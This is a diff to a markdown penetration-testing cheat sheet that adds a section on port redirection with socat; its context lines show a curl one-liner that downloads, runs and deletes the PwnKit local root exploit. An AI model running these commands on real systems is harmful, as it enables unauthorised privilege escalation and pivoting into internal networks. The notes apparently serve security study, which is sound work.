@@ -68,6 +68,8 @@
   * [Exposed Confidential Information](#Exposed-Confidential-Information)
   * [Insecure File Permissions](#Insecure-File-Permissions)
   * [Insecure System Components](#Insecure-System-Components)
+* [Port Redirection and SSH Tunneling](#Port-Redirection-and-SSH-Tunneling)
+  * [Port Forwarding with Linux Tools](#Port-Forwarding-with-Linux-Tools)
 
 # Useful
 
@@ -1491,6 +1493,18 @@ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit |
 chmod +x ./PwnKit || exit
 (sleep 1 && rm ./PwnKit & )
 ./PwnKit
+~~~
+
+
+# Port Redirection and SSH Tunneling
+
+## Port Forwarding with Linux Tools
+
+### Port Forwarding with Socat
+
+~~~ bash
+# socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<RHOST:RPORT>
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
 ~~~
 
 
